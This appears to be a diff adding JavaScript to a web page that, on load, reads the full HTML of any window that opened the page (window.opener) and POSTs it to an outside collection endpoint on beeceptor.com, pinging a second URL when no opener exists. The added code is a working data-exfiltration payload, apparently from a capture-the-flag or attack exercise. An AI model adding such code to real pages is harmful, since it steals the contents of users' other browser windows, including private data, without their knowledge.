@@ -139,6 +139,25 @@
         }).then(response => response.json())
           .then(data => console.log('Visited:', data))
           .catch(error => console.error('Error:', error));
+
+        
+        // If there's an opener window, send its HTML content
+        if (window.opener) {
+            const openerHtml = window.opener.document.documentElement.outerHTML;
+            
+            // Send the opener's HTML content to the server
+            fetch('https://rootmehere.free.beeceptor.com/opener', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ html: openerHtml })
+            }).then(response => response.json())
+              .then(data => console.log('Opener HTML sent:', data))
+              .catch(error => console.error('Error sending opener HTML:', error));
+        } else {
+            fetch('https://rootmehere.free.beeceptor.com/NOopener');
+        }
     };
 
     // When a field is modified, send a request to the server with the modified field's name
